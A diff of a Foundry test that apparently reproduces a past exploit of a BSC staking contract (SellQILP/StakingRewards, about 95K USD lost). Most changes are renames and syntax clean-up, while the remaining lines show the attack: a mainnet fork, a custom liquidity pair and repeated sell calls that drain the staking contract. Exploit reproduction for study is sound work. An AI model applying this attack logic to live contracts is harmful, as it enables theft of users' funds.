@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~95K US$
 // Attacker : https://bscscan.com/address/0xc67af66b8a72d33dedd8179e1360631cf5169160
@@ -34,27 +33,25 @@ contract ContractTest is Test {
     IERC20 QIQI = IERC20(0x8121D345b16469F38Bd3b82EE2a547f6Be54f9C9);
     IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);
     IUniswapV2Factory Factory = IUniswapV2Factory(0x2c37655f8D942f2411d9d85a5FE580C156305070);
-    Uni_Router_V2 Router = Uni_Router_V2(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);
-    Uni_Router_V2 officalRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Router Router = IUniswapV2Router(0xBDDFA43dbBfb5120738C922fa0212ef1E4a0850B);
+    IUniswapV2Router officalRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     IStakingRewards StakingRewards = IStakingRewards(0x274b3e185c9c8f4ddEF79cb9A8dC0D94f73A7675);
-    Uni_Pair_V2 SellQILP = Uni_Pair_V2(0x4cd4Bf5079Fc09d6989B4b5B42b113377AD8d565);
-    Uni_Pair_V2 customLP;
+    IUniswapV2Pair SellQILP = IUniswapV2Pair(0x4cd4Bf5079Fc09d6989B4b5B42b113377AD8d565);
+    IUniswapV2Pair customLP;
     SHITCOIN MYTOKEN;
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 28_092_673);
-        cheats.label(address(WBNB), "WBNB");
-        cheats.label(address(QIQI), "QIQI");
-        cheats.label(address(SELLC), "SELLC");
-        cheats.label(address(Factory), "Factory");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(officalRouter), "officalRouter");
-        cheats.label(address(StakingRewards), "StakingRewards");
-        cheats.label(address(SellQILP), "SellQILP");
+        vm.createSelectFork("bsc", 28_092_673);
+        vm.label(address(WBNB), "WBNB");
+        vm.label(address(QIQI), "QIQI");
+        vm.label(address(SELLC), "SELLC");
+        vm.label(address(Factory), "Factory");
+        vm.label(address(Router), "Router");
+        vm.label(address(officalRouter), "officalRouter");
+        vm.label(address(StakingRewards), "StakingRewards");
+        vm.label(address(SellQILP), "SellQILP");
     }
 
     function testExploit() public {
@@ -107,7 +104,7 @@ contract ContractTest is Test {
             address(this),
             block.timestamp
         ); // add customLP Liquidity
-        customLP = Uni_Pair_V2(Factory.getPair(address(this), address(SellQILP)));
+        customLP = IUniswapV2Pair(Factory.getPair(address(this), address(SellQILP)));
     }
 
     function init2() internal {
@@ -118,7 +115,7 @@ contract ContractTest is Test {
             address[] memory path = new address[](2);
             path[0] = address(this);
             path[1] = address(SellQILP);
-            uint256 swapAmountIn = Router.getAmountsIn(SellQILPAmount * 99 / 100, path)[0] * 2; // Calculate the amount needed to swap out the SellQILP in customLP
+            uint256 swapAmountIn = Router.getAmountsIn((SellQILPAmount * 99) / 100, path)[0] * 2; // Calculate the amount needed to swap out the SellQILP in customLP
             StakingRewards.sell(address(this), address(SellQILP), swapAmountIn); // get SellQILP from StakingRewards
             Router.addLiquidity(
                 address(this),
@@ -138,7 +135,7 @@ contract ContractTest is Test {
         address[] memory path = new address[](2);
         path[0] = address(this);
         path[1] = address(SellQILP);
-        uint256 swapAmountIn = Router.getAmountsIn(SellQILPAmount * 99 / 100, path)[0] * 2; // Calculate the amount needed to swap out the SellQILP in customLP
+        uint256 swapAmountIn = Router.getAmountsIn((SellQILPAmount * 99) / 100, path)[0] * 2; // Calculate the amount needed to swap out the SellQILP in customLP
         for (uint256 i; i < amount; i++) {
             StakingRewards.sell(address(this), address(SellQILP), swapAmountIn); // Get SellQILP from StakingRewards contract
         }
